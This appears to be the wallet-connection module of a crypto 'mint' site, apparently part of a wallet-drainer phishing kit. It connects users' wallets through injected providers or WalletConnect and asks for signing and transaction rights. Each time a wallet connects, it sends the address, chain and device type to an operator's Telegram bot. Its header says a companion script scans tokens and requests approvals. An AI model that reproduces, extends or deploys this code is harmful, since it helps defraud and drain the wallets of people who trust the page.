/* ============================================================================
 *  main.js — Wallet Connection Manager
 *  ---------------------------------------------------------------------------
 *  RESPONSIBILITY: connect a wallet and publish state to window.__apexState.
 *                  Dispatches 'wallet-connected' / 'wallet-disconnected' events.
 *
 *  Does NOT scan tokens, request approvals, or POST to the backend.
 *  script.js handles all of that.
 * ========================================================================== */

import { CONFIG } from './config.js';

/* ─── GLOBAL STATE CONTAINER ─────────────────────────────────────────────
 *  Must exist BEFORE anything else touches it. This is the single source
 *  of truth that both main.js and script.js read/write.
 * ========================================================================= */
if (!window.__apexState) {
  window.__apexState = {
    address:      null,
    chainId:      null,
    walletType:   null,
    web3:         null,
    provider:     null,
    connected:    false,
    ethPriceUSD:  2200,
    localCurrency: 'USD',
  };
}

;(function () {
  'use strict';

  /* ─── DEBUG PANEL ──────────────────────────────────────────────────── */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  document.addEventListener('dblclick', () => {
    debugArea.style.display = debugArea.style.display === 'block' ? 'none' : 'block';
  });

  function logDebug(msg) {
    try {
      console.log(`[WC] ${msg}`);
      debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
      debugArea.scrollTop = debugArea.scrollHeight;
    } catch {}
  }

  /* ─── PLATFORM ─────────────────────────────────────────────────────── */
  const isMobile   = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const isIOS      = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const isAndroid  = () => /Android/i.test(navigator.userAgent);
  const isDesktop  = () => !isMobile();
  const isWindows  = () => /Windows/i.test(navigator.userAgent);
  const isMac      = () => /Macintosh|Mac OS X/i.test(navigator.userAgent);

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ─── STATE REFERENCE ──────────────────────────────────────────────── */
  const S = window.__apexState;

  function setState(patch) {
    Object.assign(S, patch);
  }

  /* ─── TELEGRAM (connection only) ───────────────────────────────────── */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return res.ok;
    } catch (e) {
      logDebug(`Telegram failed: ${e.message}`);
      return false;
    }
  }

  /* ─── LIBRARY HANDLES ──────────────────────────────────────────────── */
  let client = null;
  let modal = null;
  let SignClient, WalletConnectModal, EthereumProvider;
  let currentSession = null;
  let isConnecting = false;

  /* ─── DOM ──────────────────────────────────────────────────────────── */
  const connectButton       = document.getElementById('connectButton');
  const walletButton        = document.getElementById('walletButton');
  const claimStatus         = document.getElementById('claimStatus');
  const announcementModal   = document.getElementById('announcementModal');
  const announcementOkBtn   = document.getElementById('announcementOkBtn');
  const referralLink        = document.getElementById('referralLink');

  /* ─── UI HELPERS ───────────────────────────────────────────────────── */
  function setButtonState(button, state) {
    if (!button) return;
    Object.assign(button.style, {
      display: 'inline-block',
      padding: '14px 28px',
      borderRadius: '8px',
      fontWeight: '600',
      border: 'none',
      cursor: state === 'loading' ? 'not-allowed' : 'pointer',
      transition: 'all 0.3s ease',
      color: 'white',
      fontSize: '16px',
      fontFamily: "'Inter', sans-serif",
      boxShadow: '0 4px 12px rgba(0, 0, 0, 0.15)',
      minWidth: '180px',
    });
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: '#DCFCE7', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: '#FEE2E2', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: '#DBEAFE', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
  }

  function showAnnouncementModal(address) {
    if (!announcementModal) return;
    if (address && referralLink) {
      const short = address.substring(0, 6) + '...' + address.substring(38);
      referralLink.textContent = `https://apex-protocol.io/ref?user=${short}`;
    }
    announcementModal.classList.add('active');
    if (isMobile()) setTimeout(hideAnnouncementModal, 10_000);
  }
  function hideAnnouncementModal() { announcementModal?.classList.remove('active'); }

  if (announcementOkBtn) announcementOkBtn.addEventListener('click', hideAnnouncementModal);

  /* ─── CONNECTED UI ─────────────────────────────────────────────────── */
  function updateConnectedUI(address, chainLabel = 'EVM') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { btn.innerHTML = orig; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');

    sendTelegramNotification(
      `🔗 <b>Wallet Connected</b>\n` +
      `👤 <code>${address}</code>\n` +
      `🌐 ${chainLabel}\n` +
      `🕒 ${new Date().toLocaleString()}\n` +
      `📱 ${isMobile() ? 'Mobile' : 'Desktop'}`
    );

    setTimeout(() => showAnnouncementModal(address), 1500);
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    hideAnnouncementModal();
  }

  /* ─── PERSISTENCE ──────────────────────────────────────────────────── */
  function saveWallet(address, session = null, chainType = 'evm') {
    try {
      localStorage.setItem('connectedWallet', address);
      localStorage.setItem('chainType', chainType);
      if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    } catch (e) { logDebug(`Save failed: ${e.message}`); }
  }

  function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
  function getSavedSession() {
    const raw = localStorage.getItem('walletConnectSession');
    return raw ? JSON.parse(raw) : null;
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    ['connectedWallet', 'walletConnectSession', 'chainType'].forEach((k) => localStorage.removeItem(k));
  }

  /* ─── WALLETCONNECT LIBRARY LOADING ────────────────────────────────── */
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    for (const url of cdns) {
      try {
        const mod = await import(url);
        SignClient = mod.default || mod;
        logDebug(`✅ SignClient loaded`);
        break;
      } catch (e) { logDebug(`SignClient ${url}: ${e.message}`); }
    }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      try {
        const mod = await import(url);
        WalletConnectModal = mod.WalletConnectModal || mod.default || mod;
        logDebug(`✅ WalletConnectModal loaded`);
        break;
      } catch (e) { logDebug(`Modal ${url}: ${e.message}`); }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      try {
        const mod = await import(url);
        EthereumProvider = mod.EthereumProvider || mod.default || mod;
        logDebug(`✅ EthereumProvider loaded`);
        break;
      } catch (e) { logDebug(`Provider ${url}: ${e.message}`); }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');
  }

  /* ─── WALLETCONNECT INIT ───────────────────────────────────────────── */
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    const projectId = useTestId ? (CONFIG.PUBLIC_TEST_ID || CONFIG.PROJECT_ID) : CONFIG.PROJECT_ID;

    client = await SignClient.init({
      projectId,
      metadata: CONFIG.DAPP_METADATA,
      relayUrl: 'wss://relay.walletconnect.com',
    });

    modal = new WalletConnectModal({
      projectId,
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index': '9999',
        '--wcm-accent-color': '#FF6B00',
        '--wcm-background-color': '#1F2937',
        '--wcm-font-family': "'Inter', sans-serif",
      },
      enableExplorer: true,
      mobileWallets: [
        { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
        { id: 'trust',    name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
        { id: 'rainbow',  name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
        { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
      ],
    });

    return true;
  }

  /* ─── EIP-6963 ─────────────────────────────────────────────────────── */
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail;
      if (!evmProviders.some((p) => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP-6963: ${detail.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  /* ─── WALLET SELECTION MODAL ──────────────────────────────────────── */
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:'Inter',sans-serif;box-shadow:0 20px 60px rgba(0,0,0,0.5);`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex;flex-direction:column;gap:10px;margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `background:#374151;border:none;padding:12px 16px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;align-items:center;gap:10px;`;
      btn.onmouseover = () => (btn.style.background = '#4B5563');
      btn.onmouseout = () => (btn.style.background = '#374151');
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => { overlay.remove(); callback(provider); });
      list.appendChild(btn);
    });

    modalEl.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  /* ─── FINALIZE CONNECTION ──────────────────────────────────────────── */
  async function finalizeEVMConnection(address, provider, walletName, session) {
    const { default: Web3 } = await import('web3');
    const web3Instance = new Web3(provider);

    let chainId = null;
    try { chainId = await web3Instance.eth.getChainId(); } catch {}

    setState({
      address,
      chainId,
      walletType: walletName,
      web3:       web3Instance,
      provider,
      connected:  true,
    });

    saveWallet(address, session, 'evm');
    updateConnectedUI(address, chainId ? `Chain ${chainId}` : 'EVM');

    // Notify script.js
    window.dispatchEvent(new CustomEvent('wallet-connected', {
      detail: { address, chainId, walletType: walletName, web3: web3Instance, provider },
    }));

    // Provider event subscriptions
    if (provider?.on) {
      provider.on('accountsChanged', (accounts) => {
        if (!accounts?.length) {
          handleDisconnect();
        } else {
          const newAddr = accounts[0];
          setState({ address: newAddr });
          updateConnectedUI(newAddr, chainId ? `Chain ${chainId}` : 'EVM');
          saveWallet(newAddr, null, 'evm');
          window.dispatchEvent(new CustomEvent('wallet-connected', {
            detail: { address: newAddr, chainId, walletType: walletName, web3: web3Instance, provider },
          }));
        }
      });

      provider.on('chainChanged', (hex) => {
        const newChainId = parseInt(hex, 16);
        setState({ chainId: newChainId });
        logDebug(`Chain changed → ${newChainId}`);
      });

      provider.on('disconnect', handleDisconnect);
    }
  }

  function handleDisconnect() {
    setState({
      address: null, chainId: null, walletType: null,
      web3: null, provider: null, connected: false,
    });
    resetConnectedUI();
    clearSavedWallet();
    window.dispatchEvent(new CustomEvent('wallet-disconnected'));
  }

  /* ─── INJECTED CONNECT ─────────────────────────────────────────────── */
  async function connectDirectEVM(timeoutMs = 5000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{ info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum }];
    }
    if (!providers.length) return false;

    let chosen = providers.length === 1 ? providers[0] : null;
    if (!chosen) {
      const known = providers.find((p) => /metamask/i.test(p.info.name));
      if (known) chosen = known;
      else {
        chosen = await new Promise((resolve) => {
          showWalletSelectionModal(providers, (selected) => resolve(selected));
        });
        if (!chosen) return false;
      }
    }

    try {
      const accounts = await Promise.race([
        chosen.provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      await finalizeEVMConnection(accounts[0], chosen.provider, chosen.info.name, null);
      return true;
    } catch (err) {
      logDebug(`Injected connect: ${err.message}`);
      return false;
    }
  }

  /* ─── WALLETCONNECT CONNECT ────────────────────────────────────────── */
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300_000) {
    if (isConnecting) return false;
    isConnecting = true;

    try {
      await initWalletConnect(useTestId);
    } catch (e) {
      isConnecting = false;
      logDebug(`WC init failed: ${e.message}`);
      return false;
    }

    try {
      showStatus('Opening WalletConnect...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI');

      modal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');

      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
      ]);

      modal.closeModal();

      const account = session?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (!account) throw new Error('No accounts in session');

      currentSession = session;

      const provider = await EthereumProvider.init({
        projectId: useTestId ? CONFIG.PUBLIC_TEST_ID : CONFIG.PROJECT_ID,
        metadata: CONFIG.DAPP_METADATA,
        session,
      });

      await finalizeEVMConnection(account, provider, 'WalletConnect', session);
      isConnecting = false;
      return true;
    } catch (err) {
      logDebug(`WC connect: ${err.message}`);
      try { modal?.closeModal(); } catch {}
      isConnecting = false;
      showStatus('Connection failed: ' + err.message, 'error');
      return false;
    }
  }

  /* ─── MAIN DISPATCHER ──────────────────────────────────────────────── */
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let ok = false;

    if (isMobile()) {
      ok = await connectViaWalletConnect(false, 300_000);
      if (!ok) ok = await connectViaWalletConnect(true, 300_000);
    } else {
      ok = await connectDirectEVM(5000);
      if (!ok) ok = await connectViaWalletConnect(false, 300_000);
      if (!ok) ok = await connectViaWalletConnect(true, 300_000);
    }

    if (!ok) {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  async function disconnectWallet() {
    try {
      if (currentSession && client) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (S.provider?.disconnect) await S.provider.disconnect();
    } catch (e) { logDebug(`Disconnect: ${e.message}`); }
    handleDisconnect();
  }

  /* ─── BUTTON WIRING ────────────────────────────────────────────────── */
  const handleClick = () => (S.connected ? disconnectWallet() : connectWallet());

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  /* ─── SESSION RESTORE ──────────────────────────────────────────────── */
  async function restoreSession() {
    const savedAddress = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedAddress || savedChain !== 'evm') return;

    if (savedSession) {
      try {
        await initWalletConnect(false);
        const session = client.session.get(savedSession.topic);
        if (session) {
          currentSession = session;
          const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (account) {
            const provider = await EthereumProvider.init({
              projectId: CONFIG.PROJECT_ID,
              metadata: CONFIG.DAPP_METADATA,
              session,
            });
            await finalizeEVMConnection(account, provider, 'WalletConnect', session);
            return;
          }
        }
      } catch (e) { logDebug(`Restore WC failed: ${e.message}`); }
    }

    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts?.[0]?.toLowerCase() === savedAddress.toLowerCase()) {
          await finalizeEVMConnection(accounts[0], window.ethereum, 'Injected', null);
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  }

  /* ─── BOOT ─────────────────────────────────────────────────────────── */
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  (async () => {
    try {
      await loadWalletConnect();
      setupEIP6963();
      await restoreSession();
    } catch (err) {
      logDebug(`Boot: ${err.message}`);
      showStatus('Failed to load wallet libraries', 'error');
    }
  })();

  logDebug(`main.js ready — ${getPlatform()} | mobile=${isMobile()}`);
})();
